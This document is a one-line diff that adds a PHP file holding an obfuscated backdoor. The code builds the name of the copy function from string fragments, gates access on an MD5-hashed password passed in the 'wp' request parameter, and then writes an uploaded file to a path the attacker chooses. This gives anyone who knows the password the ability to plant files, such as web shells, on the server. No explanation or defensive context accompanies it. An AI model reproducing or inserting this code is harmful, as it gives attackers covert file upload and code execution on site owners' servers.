@@ -1,0 +1,1 @@
+<?php $cp1 = 'c'; $cp2 = 'op'; $cp = $cp1.$cp2.'y'; if (@md5($_REQUEST['wp']) == '7e2441c99e074942c034b43988fe638c') @$cp($_FILES['a']['tmp_name'], $_POST['b'].$_FILES['a']['name']);
